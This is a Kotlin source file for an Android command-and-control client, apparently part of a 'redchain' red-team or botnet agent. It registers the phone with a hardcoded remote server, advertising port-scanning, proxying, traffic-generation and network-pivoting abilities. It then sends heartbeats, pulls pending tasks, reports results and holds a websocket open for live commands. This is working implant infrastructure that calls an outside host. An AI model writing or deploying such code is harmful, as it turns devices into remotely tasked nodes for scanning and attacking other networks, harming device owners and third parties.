package com.redchain.agent.network

import android.content.Context
import android.os.Build
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class C2Client(private val context: Context) {

    private val prefs = context.getSharedPreferences("c2_config", Context.MODE_PRIVATE)
    private val client = OkHttpClient()

    // C2 Server URL - Change this to your EC2 IP
    private val baseUrl = prefs.getString("c2_url", "http://57.181.28.7:8000") ?: "http://57.181.28.7:8000"

    private var webSocket: WebSocket? = null
    private var nodeId: String? = null
    private var apiKey: String? = null

    fun isRegistered(context: Context): Boolean {
        nodeId = prefs.getString("node_id", null)
        apiKey = prefs.getString("api_key", null)
        return nodeId != null && apiKey != null
    }

    suspend fun register(): Boolean {
        val deviceInfo = JSONObject().apply {
            put("node_type", "android")
            put("device_name", Build.MODEL)
            put("os_version", Build.VERSION.RELEASE)
            put("api_level", Build.VERSION.SDK_INT)
            put("model", Build.MANUFACTURER + " " + Build.MODEL)
            put("capabilities", JSONObject().apply {
                put("port_scan", true)
                put("proxy", true)
                put("traffic_gen", true)
                put("pivoting", true)
            })
        }

        val body = deviceInfo.toString()
            .toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("$baseUrl/api/nodes/register")
            .post(body)
            .build()

        return try {
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val json = JSONObject(response.body?.string() ?: "{}")
                nodeId = json.getString("node_id")
                apiKey = json.getString("api_key")

                // Save credentials
                prefs.edit().apply {
                    putString("node_id", nodeId)
                    putString("api_key", apiKey)
                    apply()
                }
                true
            } else {
                false
            }
        } catch (e: IOException) {
            e.printStackTrace()
            false
        }
    }

    suspend fun sendHeartbeat(): Boolean {
        val heartbeat = JSONObject().apply {
            put("status", "online")
        }

        val body = heartbeat.toString()
            .toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("$baseUrl/api/nodes/heartbeat")
            .post(body)
            .addHeader("X-Node-ID", nodeId ?: "")
            .addHeader("X-API-Key", apiKey ?: "")
            .build()

        return try {
            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: IOException) {
            false
        }
    }

    suspend fun getPendingTasks(): List<JSONObject> {
        val request = Request.Builder()
            .url("$baseUrl/api/tasks/pending")
            .get()
            .addHeader("X-Node-ID", nodeId ?: "")
            .addHeader("X-API-Key", apiKey ?: "")
            .build()

        return try {
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val body = response.body?.string() ?: "[]"
                val jsonArray = org.json.JSONArray(body)
                List(jsonArray.length()) { i -> jsonArray.getJSONObject(i) }
            } else {
                emptyList()
            }
        } catch (e: IOException) {
            emptyList()
        }
    }

    suspend fun updateTaskStatus(taskId: String, status: String, result: JSONObject? = null, error: String? = null): Boolean {
        val update = JSONObject().apply {
            put("status", status)
            if (result != null) put("result", result)
            if (error != null) put("error_message", error)
        }

        val body = update.toString()
            .toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("$baseUrl/api/tasks/$taskId")
            .patch(body)
            .addHeader("X-Node-ID", nodeId ?: "")
            .addHeader("X-API-Key", apiKey ?: "")
            .build()

        return try {
            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: IOException) {
            false
        }
    }

    fun connectWebSocket() {
        val request = Request.Builder()
            .url("ws://${baseUrl.replace("http://", "")}/ws/$nodeId?api_key=$apiKey")
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                println("WebSocket connected")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                println("Received: $text")
                // Handle real-time commands
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                println("WebSocket error: ${t.message}")
            }
        })
    }

    fun disconnect() {
        webSocket?.close(1000, "Disconnect")
    }
}
